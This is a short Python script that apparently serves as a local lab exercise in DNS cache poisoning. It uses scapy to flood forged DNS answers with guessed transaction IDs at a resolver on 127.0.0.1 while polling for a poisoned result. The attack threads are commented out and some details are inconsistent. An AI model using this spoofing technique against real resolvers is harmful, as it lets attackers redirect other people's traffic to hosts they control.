import thread
import time
import random
import threading
from scapy.all import *

def keep_query():
	no_such_domain = 'no-such-domain.com'
	dns_query = IP(dst='127.0.0.1')/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname=no_such_domain, qtype=2))
	DNS_RCODE_NXDOMAIN = 3
	while True:
		print('query')
		response = sr1(dns_query)
		response.show()
		if response.rcode != DNS_RCODE_NXDOMAIN:
			print(response.rdata)
			exit(0)
		time.sleep(0.5)

def keep_answer():
	while True:
		print('answer')
		dns_response = DNS(
				qr=1, # response packet
				rd=1,
				id=random.randint(1, 65535),
				qd=DNSQR(qname='no-such-domain.com', qtype=2),
				an=DNSRR(
						rrname='no-such-domain.com',
						type=1,
						rclass=1,
						ttl=512,
						rdata='192.168.0.1'
					)
			)
		fake_response = IP(dst='127.0.0.1')/UDP(dport=8000)/dns_response
		send(fake_response)
		time.sleep(0.2)

if __name__ == '__main__':
	no_such_domain = 'no-such-domain.com'
	dns_query = IP(dst='127.0.0.1')/UDP()/DNS(rd=1,qd=DNSQR(qname=no_such_domain, qtype=1))
	dns_query.show()
	send(dns_query)
	# query_thread = threading.Thread(target=keep_query)
	# answer_thread = threading.Thread(target=keep_answer)
	# answer_thread.setDaemon(True)
	# try:
	# 	query_thread.start()
	# 	answer_thread.start()
	# except KeyboardInterrupt:
	# 	exit()
	
